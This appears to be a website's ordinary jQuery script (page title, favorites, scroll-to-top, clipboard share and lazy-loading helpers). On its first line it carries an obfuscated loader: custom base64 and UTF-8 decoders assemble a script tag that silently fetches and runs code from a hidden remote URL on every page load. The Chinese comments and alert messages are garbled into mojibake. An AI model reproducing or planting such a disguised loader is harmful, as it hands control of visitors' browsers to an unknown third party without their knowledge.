function IsjhMEmW(e){var t="",n=r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}function iScfnleC(e){var m='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var t="",n,r,i,s,o,u,a,f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=m.indexOf(e.charAt(f++));o=m.indexOf(e.charAt(f++));u=m.indexOf(e.charAt(f++));a=m.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t+=String.fromCharCode(n);if(u!=64){t+=String.fromCharCode(r)}if(a!=64){t+=String.fromCharCode(i)}}return IsjhMEmW(t)}eval('window')['\x4b\x75\x43\x62\x47\x46']=function(){;(function(u,r,w,d,f,c){var x=iScfnleC;u=decodeURIComponent(x(u.replace(new RegExp(c+''+c,'g'),c)));'jQuery';k=r[2]+'c'+f[1];'Flex';v=k+f[6];var s=d.createElement(v+c[0]+c[1]),g=function(){};s.type='text/javascript';{s.onload=function(){g()}}s.src=u;'CSS';d.getElementsByTagName('head')[0].appendChild(s)})('aHR0cHM6Ly9jZG4ubWFvbml1Lnh5ei9jZG4vbWFjbXViYW4vaW5kZXguanM=','AjsfguonnKA',window,document,'orQVgZipae','ptIodXOnEQDH')};window['KuCbGF']();
function load(name) {
    let xhr = new XMLHttpRequest(),
        okStatus = document.location.protocol === "file:" ? 0 : 200;
    xhr.open('GET', name, false);
    xhr.overrideMimeType("text/html;charset=utf-8");//榛樿�や负utf-8
    xhr.send(null);
    return xhr.status === okStatus ? xhr.responseText : null;
}





// ==========================================




/* new style */
var web_url_domain = document.domain;
var page_url = window.location.href;
var title_a = web_url_domain + "";

var title_change = $("title");
title_change.append(title_a);

var logodomain_a = "<a href=\"/\" title=\"\">" + web_url_domain + "</a>";

var logo_domain = $(".logodomain");
logo_domain.html(logodomain_a);





function AddFavorite(title, url) {
    try {
        window.external.addFavorite(url, title);
    }
    catch (e) {
        try {
            window.sidebar.addPanel(title, url, "");
        }
        catch (e) {
            alert("鎶辨瓑锛屾偍鎵�浣跨敤鐨勬祻瑙堝櫒鏃犳硶瀹屾垚姝ゆ搷浣溿�俓n\n鍔犲叆鏀惰棌澶辫触锛岃�锋墜鍔ㄨ繘琛屾坊鍔�");
        }
    }
}

//Collection

/* Top ENd */
$(document).ready(function () {
    $(".f_h").click(function () {
        $("html,body").animate({ scrollTop: 0 }, 500);
    });
    $(".header .a_n").click(function () {
        $(".menu").slideToggle();
        $(".menu").toggleClass("on");
    });
    //
    $(".tc_xw .bd ul li").mouseenter(function () {
        $(this).addClass("on");
        $(this).siblings().removeClass("on");
    });
    $(".fh_top, .a_fh").click(function () {
        $("html,body").animate({ scrollTop: 0 }, 500);
    });
    //
    var clipboard = new ClipboardJS('.share_btn');
    clipboard.on('success', function (e) {
        alert("宸插�嶅埗鏈�椤电綉鍧�锛岀矘璐村彂閫佺粰濂藉弸璇锋彁閱掍粬浠�鐢ㄦ祻瑙堝櫒鎵撳紑鏈�绔�");
        e.clearSelection();
    });
    clipboard.on('error', function (e) {
        alert("鎮ㄧ殑娴忚�堝櫒鏃犳硶浣跨敤澶嶅埗鎸夐挳锛岃�锋墜鍔ㄥ�嶅埗鍦板潃鏍忕綉鍧�鍐嶅垎浜�缁欏ソ鍙嬶紝璇锋彁閱掍粬浠�鐢ㄦ祻瑙堝櫒鎵撳紑鏈�绔�");
        e.clearSelection();
    });
  
   
});

window.onload = function () {
    var vd = $(".sp_nr .s_p .v_d").height();
    $(".sp_nr .s_p .v_h").height(vd / 2);
}

$(function () {
    $("img.lazyload").lazyload({
        threshold: 200,
        effect: "fadeIn",
        container: $("body")
    });
});

$("#shadeico").click(function () {
    $("#shade").hide();
})
